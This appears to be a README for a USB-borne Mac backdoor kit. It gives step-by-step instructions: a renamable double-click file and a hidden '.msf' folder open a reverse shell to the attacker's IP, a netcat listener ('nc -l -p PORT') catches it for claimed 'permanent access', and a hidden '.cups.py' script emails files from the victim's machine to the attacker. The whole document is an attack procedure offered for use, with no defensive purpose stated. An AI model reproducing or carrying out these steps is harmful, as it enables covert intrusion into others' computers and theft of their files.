1. Get a usb and name it "LMAO"
2. Put file "Click to spawn RS" and folder ".msf" inside the usb
3. cd into .msf and vim file "4444". Replace "IP" with your public IP address and "Port" with the port you would like to send on
4. To run, put USB in Mac and double click file "Click to spawn RS"
5. You also must setup port forwarding on your router, look up how to do this
6. Now to listen for the reverse shell, go into your mac terminal and type "nc -l -p PORT -vvv" (replace PORT with the port you sent it on)
7. You have permanent access to the remote computer, can control it via the command line 

NOTE: File "Click to spawn RS" can be renamed to whatever you like.


EMAIL FILES TO YOURSELF:
1. To email any file to yourself, you must set up two email accounts, one to send the file (sending email) and one to receive the file (receiving email). Edit the cups.py file inside the .msf folder and input a receiving and sending email address, as well as the password for the sending email.

2. To send a file to yourself once reverse shell is spawned and a connection has been made, enter the home directory (type "cd") and then enter "python .cups.py PATH_TO FILE" e.g. "python .cups.py ~/Desktop/funnyPic.jpg" 

